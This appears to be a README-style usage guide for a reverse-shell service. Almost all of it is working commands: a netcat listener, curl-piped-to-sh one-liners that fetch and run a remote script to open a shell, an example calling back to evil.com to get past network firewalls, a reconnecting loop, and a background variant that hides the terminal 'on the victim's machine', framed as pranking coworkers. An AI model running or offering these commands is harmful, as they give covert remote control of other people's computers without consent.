### Listen for connection
`nc -l 1337`

###  Execute reverse shell on target
On the target machine, pipe the output of https://reverse-shell.sh/yourip:port into sh.
```
curl https://reverse-shell.sh/192.168.0.69:1337 | sh
```
Hostname
You can use a hostname instead of an IP.
```
curl https://reverse-shell.sh/localhost:1337 | sh
```
## Remote connections
Because this is a reverse connection it can punch through firewalls and connect to the internet.
You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with.
```
curl https://reverse-shell.sh/evil.com:1337 | sh
```
## Reconnecting
By default when the shell exits you lose your connection. You may do this by accident with an invalid command. You can easily create a shell that will attempt to reconnect by wrapping it in a while loop.
```
while true; do curl https://reverse-shell.sh/yourip:1337 | sh; done
```
Be careful if you do this to a coworker, if they leave the office with this still running you're opening them up to attack.

## Running as a background process
The terminal session needs to be kept open to persist the reverse shell connection. That might be a bit of a giveaway if you're trying to prank coworkers.
The following command will run the reverse shell in a background process and exit the terminal, leaving no suspicious looking terminal windows open on the victim's machine.
Make sure you run this in a fresh terminal window otherwise you'll lose any work in your existing session.
```
sh -c "curl https://shell.now.sh/localhost:1337 | sh -i &" && exit
```
